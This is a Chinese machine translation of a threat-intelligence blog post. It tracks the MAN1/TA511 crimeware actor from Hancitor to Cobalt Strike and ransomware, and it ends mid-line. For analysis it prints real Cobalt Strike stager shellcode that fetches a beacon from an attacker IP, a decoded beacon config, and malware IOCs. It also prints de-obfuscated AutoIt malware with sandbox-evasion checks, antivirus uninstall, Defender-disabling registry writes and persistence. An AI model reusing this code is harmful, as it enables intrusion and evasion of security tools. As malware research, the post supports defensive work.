<html>
<head>
<title>MAN1, Moskal, Hancitor and a side of Ransomware</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">曼1，莫斯卡尔，汉西特和勒索软件的一面</h1>
<blockquote>原文：<a href="https://medium.com/walmartglobaltech/man1-moskal-hancitor-and-a-side-of-ransomware-d77b4d991618?source=collection_archive---------0-----------------------#2021-01-10">https://medium.com/walmartglobaltech/man1-moskal-hancitor-and-a-side-of-ransomware-d77b4d991618?source=collection_archive---------0-----------------------#2021-01-10</a></blockquote><div><div class="ds gv gw gx gy gz"/><div class="ha hb hc hd he"><figure class="hg hh ez fb hi hj er es paragraph-image"><div role="button" tabindex="0" class="hk hl di hm bf hn"><div class="er es hf"><img src="../Images/c0ae922703b10821816d75fe194e302b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EX90G040eDpJa4bBj9k3xg.png"/></div></div></figure><div class=""/><p id="4d88" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated"><a class="ae jn" href="https://vixra.org/abs/1902.0257" rel="noopener ugc nofollow" target="_blank"> MAN1 </a>又名<a class="ae jn" href="https://www.blueliv.com/downloads/network-insights-into-vawtrak-v2.pdf" rel="noopener ugc nofollow" target="_blank"> Moskalvzapoe </a>又名<a class="ae jn" href="https://www.proofpoint.com/sites/default/files/pfpt-us-tr-q117-threat-report.pdf" rel="noopener ugc nofollow" target="_blank"> TA511 </a>都是对至少自2014年以来一直活跃在大多数主要犯罪软件活动中的威胁参与者(TA)的称呼。</p><p id="d6bf" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">在过去的几年中，大多数主要的电子犯罪集团已经从正常的银行特洛伊木马操作转向赎金和数据盗窃，这种转变已被证明对他们非常有利，尽管这与过去相比是一个巨大的转变，在过去，锁定活动被认为是低级活动和感染的浪费。</p><figure class="jp jq jr js fd hj er es paragraph-image"><div role="button" tabindex="0" class="hk hl di hm bf hn"><div class="er es jo"><img src="../Images/8be987cae1f11bf6dc181fd447941404.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*atNE5p5cqiDexAEetOIIKw.jpeg"/></div></div><figcaption class="jt ju et er es jv jw bd b be z dx">Ransomware payments from FBI, Photo Credit <a class="ae jn" href="https://published-prd.lanyonevents.com/published/rsaus20/sessionsFiles/17627/2020_USA20_SEM-M03H_01_Feds-Fighting-Ransomware-How-the-FBI-Investigates-and-How-You-Can-Help.pdf" rel="noopener ugc nofollow" target="_blank">FBI Special Agent Joel DeCapua</a></figcaption></figure><p id="bda7" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">随着越来越多的团体开始转向以企业为重点的勒索软件活动，到2020年，这导致了一种趋势，即公司开始通过支付赎金来资助这些电子犯罪集团，使他们成为拥有与任何主要安全初创公司相媲美的资金的犯罪组织。MAN1也不例外，因为许多研究人员开始注意到<a class="ae jn" href="https://isc.sans.edu/forums/diary/Hancitor+infection+with+Pony+Evil+Pony+Ursnif+and+Cobalt+Strike/25532/" rel="noopener ugc nofollow" target="_blank"> Hancitor/Chanitor活动开始导致CobaltStrike </a>。</p><p id="8b30" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">在SANS文章的链接沙盒报告中，我们可以下载并解码列出的chanitor/hancitor任务:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="fcd9" class="kc kd hs jy b fi ke kf l kg kh">http://yudiartawan.com/a</span></pre><p id="9bca" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">通过使用前8个字节作为XOR密钥，然后对结果进行LZNT解压缩，可以对文件进行解码。</p><p id="6686" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">解码文件后，我们剩下一个打包的CobaltStrike stager，这些stager是由CobaltStrike构建的，很像信标文件，因为两者将共享相同的水印。解包后，我们可以解码负责下载信标文件的外壳代码:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="db7b" class="kc kd hs jy b fi ke kf l kg kh">\xfc\xe8\x89\x00\x00\x00`\x89\xe51\xd2d\x8bR0\x8bR\x0c\x8bR\x14\x8br(\x0f\xb7J&amp;1\xff1\xc0\xac&lt;a|\x02, \xc1\xcf\r\x01\xc7\xe2\xf0RW\x8bR\x10\x8bB&lt;\x01\xd0\x8b@x\x85\xc0tJ\x01\xd0P\x8bH\x18\x8bX \x01\xd3\xe3&lt;I\x8b4\x8b\x01\xd61\xff1\xc0\xac\xc1\xcf\r\x01\xc78\xe0u\xf4\x03}\xf8;}$u\xe2X\x8bX$\x01\xd3f\x8b\x0cK\x8bX\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89D$$[[aYZQ\xff\xe0X_Z\x8b\x12\xeb\x86]hnet\x00hwiniThLw&amp;\x07\xff\xd51\xffWWWWWh:Vy\xa7\xff\xd5\xe9\x84\x00\x00\x00[1\xc9QQj\x03QQhP\x00\x00\x00SPhW\x89\x9f\xc6\xff\xd5\xebp[1\xd2Rh\x00\x02@\x84RRRSRPh\xebU.;\xff\xd5\x89\xc6\x83\xc3P1\xffWWj\xffSVh-\x06\x18{\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x001\xff\x85\xf6t\x04\x89\xf9\xeb\th\xaa\xc5\xe2]\xff\xd5\x89\xc1hE!^1\xff\xd51\xffWj\x07QVPh\xb7W\xe0\x0b\xff\xd5\xbf\x00/\x00\x009\xc7t\xb71\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff/tYX7\x00\xa13x\xd3\'&amp;J\xbct\x00\r\xb8f\xbb\xc7o\x83E\xc5\x1d\xc6O&lt;*\xd3KC,&lt; \x90\x93\x98|\xee\x02g\xc2\xe4\xeej\x90\xa2\xb4\xa7\xc8$\x14\xd3\xfb\x1a\xfc\xdb\x08\xd4\xee\x82\xe0\xceU\x98R\x91]/\xf71\xe3\xa9\xbc3F\xd6\x00User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; ASU2JS)\r\n\x00\xdd\xe2nU\x0f\x16X[q\xd9e\xb0\x81\xf3k|FQ\xeaM\xa3`\xab\xc2_\x1e\\\x1dA\x00\x85o\xda\xfb\tNz\x9bShy\x14\x0c\xa9\xa8M\x83\'\xc6[\xe0\xfa\xcbzJ\xc5d\xa8\x1b\xf3gy\xb195\xf6N\r\xf9\xe5j_\x92F\x0c\x181zf7\xc9\xac(4\x13,\xdd^\xf9\x96\x03\x17Ispt\xd9"~\x162B\x13q\xcd\x90\xec\xc5%\xbc\xda\x86r\xb2\xfeh\xd5\xf5W\r\x0f\xd8\xdeKl\x8e\x95\x1c\x04\x97\x8f\xdf1^\xecS\x97\xb2\x1a\xf1\xe0\xa5\x8b\x03\xee\xebb\xcc\xe2\x9c\xfah\xbd\xc1\xd1\xbe3\x80o0\x17\x03\xef&lt;a\x8f\xe6\xb6\xeb\x82X0\x88x\x93\xe1{\xf1S\xc8&amp;;\xc6&lt;\x12\x97\x8d\xe8\xfcu\xc2\x05!\x04\xa6C\xc9\xc6.\x93\x85\x89\x01e!8@\x1e3\x00h\xf0\xb5\xa2V\xff\xd5j@h\x00\x10\x00\x00h\x00\x00@\x00WhX\xa4S\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9QS\x89\xe7Wh\x00 \x00\x00SVh\x12\x96\x89\xe2\xff\xd5\x85\xc0t\xc6\x8b\x07\x01\xc3\x85\xc0u\xe5X\xc3\xe8\xa9\xfd\xff\xff31.44.184.125\x00o\xaaQ\xc3</span></pre><p id="accd" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">该stager外壳代码将从以下位置下载并引爆编码信标:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="1daa" class="kc kd hs jy b fi ke kf l kg kh">31.44.184.125/tYX7</span></pre><p id="48b4" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">该文件在沙盒运行中也是可用的，因此我们可以解码顶部有外壳代码包装的文件，然后解码CobaltStrike信标配置。</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="d89a" class="kc kd hs jy b fi ke kf l kg kh">{'PROXY_BEHAVIOR': '2', 'PROTOCOL': '0', 'SPAWNTO_X64': '%windir%\\sysnative\\rundll32.exe', 'SLEEPTIME': '60000', 'KillDate': '0', 'C2_VERB_GET': 'GET', 'ProcInject_Prepend_x64': '', 'ProcInject_StartRWX': '64', 'DNS_SLEEP': '0', 'ProcInject_Prepend_x86': '', 'ProcInject_MinAllocSize': '0', 'ProcInject_UseRWX': '64', 'MAXGET': '1048576', 'USERAGENT': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; MAGWJS)', 'PORT': '80', 'DNS_IDLE': '0', 'ProcInject_AllocationMethod': '0', 'UsesCookies': '1', 'C2_POSTREQ': "[('_HEADER', 0, 'Content-Type: application/octet-stream'), ('BUILD', ('PARAMETER', 'id'))]", 'WATERMARK': '1873433027', 'textSectEnd': '0', 'PUBKEY': '30819f300d06092a864886f70d010101050003818d0030818902818100d8c44da76cfed63a526be88bf19e5112c9a1022aa050f59b43ad9b0d265d5eeff5ece70f724e44d7f5ef725c87684045eeaf9af17d6c6fd4a62037e7e7f07b9b6ae33a2fb21ff7ca986a504cc71cfd906bd1919692a5526f0b8c3c45a2e678231d3913e5136dd656dbfa914d870436f9ac39d696682754bd8e56adb5e848b75d0203010001', 'SPAWNTO_X86': '%windir%\\syswow64\\rundll32.exe', 'C2_REQUEST': "[('BUILD', ('BASE64', 'HEADER', 'Cookie'))]", 'CRYPTO_sCHEME': '0', 'ITTER': '0', 'C2_RECOVER': '\x04', 'C2_CHUNK_POST': '0', 'ProcInject_Execute': '\x01\x02\x03\x04', 'PIPENAME': '', 'C2_VERB_POST': 'POST', 'bStageCleanup': '0', 'SUBMITURI': '/submit.php', 'DOMAINS': '31.44.184.125,/updates.rss', 'bCFGCaution': '0', 'MAXDNS': '255'}</span></pre><p id="ecb6" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">信标中的水印也与登台程序可执行文件中的外壳代码相匹配:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="893f" class="kc kd hs jy b fi ke kf l kg kh">'WATERMARK': '1873433027'</span><span id="354c" class="kc kd hs jy b fi ki kf l kg kh">\xff31.44.184.125\x00o\xaaQ\xc3</span></pre><p id="8205" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">可以通过滥用信标配置的结构和已知的XOR密钥来开启水印，我们取水印值:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="d8f3" class="kc kd hs jy b fi ke kf l kg kh">o\xaaQ\xc3</span></pre><p id="b697" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">与0x69进行异或运算:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="605c" class="kc kd hs jy b fi ke kf l kg kh">\x06\xc38\xaa</span></pre><p id="ee04" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">我们可以在信标中找到这个值:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="c096" class="kc kd hs jy b fi ke kf l kg kh">&gt;&gt;&gt; a = ‘\x06\xc38\xaa’<br/>&gt;&gt;&gt; data = open(‘tYX7.decoded’, ‘rb’).read()<br/>&gt;&gt;&gt; data.find(a)<br/>202686<br/>&gt;&gt;&gt; data[202650:202700]<br/>‘ijiy9&amp;:=iiiiiiiiiiiiiuikimiiiiiLikim\x06\xc38\xaaiOihikiiiN’</span></pre><p id="da09" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">然后基于部分编码数据进行VT内容搜索:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="9821" class="kc kd hs jy b fi ke kf l kg kh">content:"{696b696d06c338aa}"</span></pre><p id="0651" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">这导致了一堆要旋转到的文件。</p><figure class="jp jq jr js fd hj er es paragraph-image"><div role="button" tabindex="0" class="hk hl di hm bf hn"><div class="er es kj"><img src="../Images/992261f0a54a34649fe1128a6918730e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Z_NggdtNv5iHaSa_3kfv5g.png"/></div></div></figure><p id="cbcd" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">然而，如果CS包被共享或泄露，那么它可能会让你陷入各种各样的兔子洞，你可以使用它来找到大量的样本，然后自动解码所有的配置数据，并比较信标配置和模板，以尝试找到更多的相关文件。</p><p id="799f" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">目前，我感兴趣的是一个与IP对话的样本，它与上一个样本使用相同的打包器打包:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="e320" class="kc kd hs jy b fi ke kf l kg kh">bd3c278309e4fe19f7b424ee0b56a1a2c0bbae3a59882d5b6f171d3ca89f728b</span></pre><p id="0ee2" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">解压缩该文件会得到类似的外壳代码:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="105d" class="kc kd hs jy b fi ke kf l kg kh">\xfc\xe8\x89\x00\x00\x00`\x89\xe51\xd2d\x8bR0\x8bR\x0c\x8bR\x14\x8br(\x0f\xb7J&amp;1\xff1\xc0\xac&lt;a|\x02, \xc1\xcf\r\x01\xc7\xe2\xf0RW\x8bR\x10\x8bB&lt;\x01\xd0\x8b@x\x85\xc0tJ\x01\xd0P\x8bH\x18\x8bX \x01\xd3\xe3&lt;I\x8b4\x8b\x01\xd61\xff1\xc0\xac\xc1\xcf\r\x01\xc78\xe0u\xf4\x03}\xf8;}$u\xe2X\x8bX$\x01\xd3f\x8b\x0cK\x8bX\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89D$$[[aYZQ\xff\xe0X_Z\x8b\x12\xeb\x86]hnet\x00hwiniThLw&amp;\x07\xff\xd51\xffWWWWWh:Vy\xa7\xff\xd5\xe9\x84\x00\x00\x00[1\xc9QQj\x03QQhP\x00\x00\x00SPhW\x89\x9f\xc6\xff\xd5\xebp[1\xd2Rh\x00\x02@\x84RRRSRPh\xebU.;\xff\xd5\x89\xc6\x83\xc3P1\xffWWj\xffSVh-\x06\x18{\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x001\xff\x85\xf6t\x04\x89\xf9\xeb\th\xaa\xc5\xe2]\xff\xd5\x89\xc1hE!^1\xff\xd51\xffWj\x07QVPh\xb7W\xe0\x0b\xff\xd5\xbf\x00/\x00\x009\xc7t\xb71\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff/tYX7\x00\xa13x\xd3\'&amp;J\xbct\x00\r\xb8f\xbb\xc7o\x83E\xc5\x1d\xc6O&lt;*\xd3KC,&lt; \x90\x93\x98|\xee\x02g\xc2\xe4\xeej\x90\xa2\xb4\xa7\xc8$\x14\xd3\xfb\x1a\xfc\xdb\x08\xd4\xee\x82\xe0\xceU\x98R\x91]/\xf71\xe3\xa9\xbc3F\xd6\x00User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; ASU2JS)\r\n\x00\xdd\xe2nU\x0f\x16X[q\xd9e\xb0\x81\xf3k|FQ\xeaM\xa3`\xab\xc2_\x1e\\\x1dA\x00\x85o\xda\xfb\tNz\x9bShy\x14\x0c\xa9\xa8M\x83\'\xc6[\xe0\xfa\xcbzJ\xc5d\xa8\x1b\xf3gy\xb195\xf6N\r\xf9\xe5j_\x92F\x0c\x181zf7\xc9\xac(4\x13,\xdd^\xf9\x96\x03\x17Ispt\xd9"~\x162B\x13q\xcd\x90\xec\xc5%\xbc\xda\x86r\xb2\xfeh\xd5\xf5W\r\x0f\xd8\xdeKl\x8e\x95\x1c\x04\x97\x8f\xdf1^\xecS\x97\xb2\x1a\xf1\xe0\xa5\x8b\x03\xee\xebb\xcc\xe2\x9c\xfah\xbd\xc1\xd1\xbe3\x80o0\x17\x03\xef&lt;a\x8f\xe6\xb6\xeb\x82X0\x88x\x93\xe1{\xf1S\xc8&amp;;\xc6&lt;\x12\x97\x8d\xe8\xfcu\xc2\x05!\x04\xa6C\xc9\xc6.\x93\x85\x89\x01e!8@\x1e3\x00h\xf0\xb5\xa2V\xff\xd5j@h\x00\x10\x00\x00h\x00\x00@\x00WhX\xa4S\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9QS\x89\xe7Wh\x00 \x00\x00SVh\x12\x96\x89\xe2\xff\xd5\x85\xc0t\xc6\x8b\x07\x01\xc3\x85\xc0u\xe5X\xc3\xe8\xa9\xfd\xff\xff31.44.184.125\x00o\xaaQ\xc3</span></pre><p id="4ea2" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">与前一个相同的水印、IP地址和URI，但是这个文件在VirusTotal中有一个有趣的ITW(在野外)记录:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="a07c" class="kc kd hs jy b fi ke kf l kg kh">http://en.bulgarienview.com/wp-content/themes/twentynineteen/inc/artvnch.exe</span></pre><p id="ce1d" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">artvnch.exe作为CS stager的文件名可以看作是VirusTotal中Amadey bot的任务，f 3823 F8 C3 D1 F3 d 45 E1 a 9268 df 5b 89 F9 f 60 fa 02 F8 ad 267 e 7 e 6 b 7 cbff 74 dcaf 627。</p><p id="a5a9" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">该Amadey与MAN1、版本1.43和C2s相关联:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="0942" class="kc kd hs jy b fi ke kf l kg kh">compturot .com/f5lkB/index.php<br/>thaturicia .ru/f5lkB/index.php<br/>cholopethe .ru/f5lkB/index.php</span></pre><p id="6611" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">实际上，我们可以找到许多同名的文件，它们是作为任务下载的CS stagers。</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="1364" class="kc kd hs jy b fi ke kf l kg kh">be4c49df859762dc2c7d11794f5731dd498698158b11a9ff18b3f91fdc1f591a</span><span id="9339" class="kc kd hs jy b fi ki kf l kg kh">CS stager downloaded from:  hxxp://phtmierzwa.]com/plugins/content/apismtp/artifact125.exe</span><span id="a133" class="kc kd hs jy b fi ki kf l kg kh">655346f41c456cefd9d40c1b9484f1c0dfa36d180c72dd2d1ada26661be1ca6d</span><span id="123c" class="kc kd hs jy b fi ki kf l kg kh">CS stager downloaded from:  hxxp://rsmleather.]com/wp-content/plugins/so-widgets-bundle/artvnch.exe</span><span id="7d4b" class="kc kd hs jy b fi ki kf l kg kh">2d038b20eaf05bb8d673542f1dbab6a376abb05bf10d38b04f163cfd6c2a7252 </span><span id="33dd" class="kc kd hs jy b fi ki kf l kg kh">CS stager downloaded from: hxxp://fastwaylogistic[.]com/artvnch.exe</span><span id="22ea" class="kc kd hs jy b fi ki kf l kg kh">a0f49754f0fe204ad9020c1677f09018d3ab7dd3e45e1b66766cdd17700b54df</span><span id="b321" class="kc kd hs jy b fi ki kf l kg kh">CS stager downloaded from: hxxp://lumispot[.com/wp-content/plugins/nextgen-gallery/artvnch.exe</span></pre><p id="8341" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">参与者似乎使用此范围内的多个IP地址以及其他一些地址，例如:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="7214" class="kc kd hs jy b fi ke kf l kg kh">45.142.213.167</span></pre><figure class="jp jq jr js fd hj er es paragraph-image"><div class="er es kk"><img src="../Images/27be7842841ce6a2b79681f1abdd50ab.png" data-original-src="https://miro.medium.com/v2/resize:fit:1152/format:webp/1*pf9BpFMwEIzfgmphDX3wRA.png"/></div></figure><p id="5157" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">我们可以再次看到一些artvnch.exe的名字，但也可以看到一个work.exe文件，这是一个CS stager下载信标，来自:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="7b95" class="kc kd hs jy b fi ke kf l kg kh">45.142.213.167/imP6</span></pre><p id="ec8f" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">水印也与我们之前识别的CS文件相同。该服务器托管了许多其他有趣的文件:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="83fc" class="kc kd hs jy b fi ke kf l kg kh">ea93c89dbf63ec462f19f6ac039c0cdf3d283b64eaadd6c38679c9b70710bd71, doe_install.exe<br/>6e4459199d7fbdc4c215e595906e78fdd1c15ad3be6abed6540b80de17b63f3b,oxford.exe</span></pre><p id="46a4" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated"><strong class="ir ht">ea 93 c 89 DBF 63 EC 462 f 19 F6 AC 039 c 0 CD F3 d 283 b 64 ea add 6 c 38679 c 9 b 70710 BD 71</strong></p><p id="e4ac" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">根据VirusTotal上的缓存沙盒报告，文件doe_install.exe将与另一台CS服务器对话:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="cb37" class="kc kd hs jy b fi ke kf l kg kh">185.153.196.207</span></pre><p id="b6a7" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">这是一个autoit编译的脚本，最终将引爆两个文件，但也执行一些反检查。</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="af74" class="kc kd hs jy b fi ke kf l kg kh">$john = "John"<br/>$name1 = "Peter Wilson"<br/>$name2 = "Acme"<br/>$name3 = "BOBSPC"<br/>$name4 = "Johnson"<br/>$name5 = "John"<br/>$name6 = "John Doe"<br/>$name7 = "Rivest"<br/>$name8 = "mw"<br/>$name9 = "me"<br/>$name10 = "sys"<br/>$name11 = "Apiary"<br/>$name12 = "STRAZNJICA.GRUBUTT"<br/>$name13 = "Phil"<br/>$name14 = "Customer"<br/>$name15 = "shimamu"<br/>$pcname1 = "RALPHS-PC"<br/>$pcname2 = "ABC-WIN7"<br/>$pcname3 = "man-PC"<br/>$pcname4 = "luser-PC"<br/>$pcname5 = "Klone-PC"<br/>$pcname6 = "tpt-PC"<br/>$pcname7 = "BOBSPC"<br/>$pcname8 = "WillCarter-PC"<br/>$pcname9 = "PETER-PC"<br/>$pcname10 = "David-PC"<br/>$pcname11 = "ART-PC"<br/>$pcname12 = "TOM-PC"<br/>If ProcessExists("frida-winjector-helper-32.exe") OR ProcessExists("analyzer.exe") Then<br/>	Exit<br/>EndIf<br/>$name = @UserName<br/>$pcname = @ComputerName<br/>If @ComputerName = "WIN7SP1-SSLCAP" Then<br/>	Exit<br/>EndIf<br/>If FileExists(@DesktopDir &amp; "\secret.txt") Then<br/>	Exit<br/>EndIf<br/>If FileExists(@DesktopDir &amp; "\my.txt") Then<br/>	Exit<br/>EndIf<br/>If FileExists(@DesktopDir &amp; "\report.odt") Then<br/>	Exit<br/>EndIf<br/>If FileExists(@DesktopDir &amp; "\report.rtf") Then<br/>	Exit<br/>EndIf<br/>If FileExists(@DesktopDir &amp; "\Incidents.pptx") Then<br/>	Exit<br/>EndIf<br/>If $name = $name1 Then<br/>	Exit<br/>EndIf<br/>If $name = $name2 Then<br/>	Exit<br/>EndIf<br/>If $name = $name3 Then<br/>	Exit<br/>EndIf<br/>If $name = $name4 Then<br/>	Exit<br/>EndIf<br/>If $name = $name5 Then<br/>	Exit<br/>EndIf<br/>If $name = $name6 Then<br/>	Exit<br/>EndIf<br/>If $name = $name7 Then<br/>	Exit<br/>EndIf<br/>If $name = $name8 Then<br/>	Exit<br/>EndIf<br/>If $name = $name9 Then<br/>	Exit<br/>EndIf<br/>If $name = $name10 Then<br/>	Exit<br/>EndIf<br/>If $name = $name11 Then<br/>	Exit<br/>EndIf<br/>If $name = $name12 Then<br/>	Exit<br/>EndIf<br/>If $name = $name13 Then<br/>	Exit<br/>EndIf<br/>If $name = $name14 Then<br/>	Exit<br/>EndIf<br/>If $name = $name15 Then<br/>	Exit<br/>EndIf<br/>If $pcname = $pcname1 Then<br/>	Exit<br/>EndIf<br/>If $pcname = $pcname2 Then<br/>	Exit<br/>EndIf<br/>If $pcname = $pcname3 Then<br/>	Exit<br/>EndIf<br/>If $pcname = $pcname4 Then<br/>	Exit<br/>EndIf<br/>If $pcname = $pcname5 Then<br/>	Exit<br/>EndIf<br/>If $pcname = $pcname6 Then<br/>	Exit<br/>EndIf<br/>If $pcname = $pcname7 Then<br/>	Exit<br/>EndIf<br/>If $pcname = $pcname8 Then<br/>	Exit<br/>EndIf<br/>If $pcname = $pcname9 Then<br/>	Exit<br/>EndIf<br/>If $pcname = $pcname10 Then<br/>	Exit<br/>EndIf<br/>If $pcname = $pcname11 Then<br/>	Exit<br/>EndIf<br/>If $pcname = $pcname12 Then<br/>	Exit<br/>EndIf<br/>If ProcessExists("joeboxcontrol.exe") OR ProcessExists("joeboxserver.exe") Then<br/>	Exit<br/>EndIf<br/>If @OSVersion = "WIN_XP" Then<br/>	Exit<br/>EndIf<br/>If FileExists("C:\ProgramData\Microsoft\Check\Check.txt") Then<br/>	Exit</span></pre><p id="4021" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">试图禁用或卸载安全软件:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="4c17" class="kc kd hs jy b fi ke kf l kg kh">If ProcessExists("msseces.exe") Then<br/>	$scmd = 'C:\Windows\System32\wbem\wmic.exe product where name="Microsoft Security Client" call uninstall /nointeractive'<br/>	$ipid = Run(@ComSpec &amp; ' /C "' &amp; $scmd &amp; '"', "", @SW_HIDE)<br/>	Sleep(8000)</span><span id="01b9" class="kc kd hs jy b fi ki kf l kg kh">DirCreate("C:\Programdata\install")<br/>	DirCreate("C:\Programdata\RunDLL")<br/>	DirCreate("C:\Programdata\Microsoft\Intel")<br/>	DirCreate("C:\Programdata\System32\logs")<br/>	DirCreate("C:\ProgramData\Microsoft\Check")<br/>	DirCreate("C:\ProgramData\RealtekHD")<br/>	DirCreate("C:\programdata\WindowsTask")<br/>	DirCreate("C:\programdata\Microsoft\temp")<br/>	$logfile = "C:\Programdata\Microsoft\Check\Check.txt"<br/>	If NOT FileExists($logfile) Then _filecreate($logfile)<br/>	$pathscript = "C:\ProgramData\RealtekHD\taskhostw.exe"<br/>	$sname = ("Realtek HD Audio")<br/>	RegWrite("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", $sname, "REG_SZ", $pathscript)<br/>	RegWrite("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList", "John", "REG_DWORD", 0)<br/>	RegWrite("HKLM64\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList", "John", "REG_DWORD", 0)<br/>	Sleep(100)<br/>	RegWrite("HKLM64\SOFTWARE\SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "REG_DWORD", 1)<br/>	RegWrite("HKLM\SOFTWARE\SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "REG_DWORD", 1)<br/>	Sleep(100)<br/>	RegWrite("HKLM64\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableIOAVProtection", "REG_DWORD", 1)<br/>	RegWrite("HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableIOAVProtection", "REG_DWORD", 1)<br/>	Sleep(50)<br/>	RegWrite("HKLM64\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "REG_DWORD", 1)<br/>	RegWrite("HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", 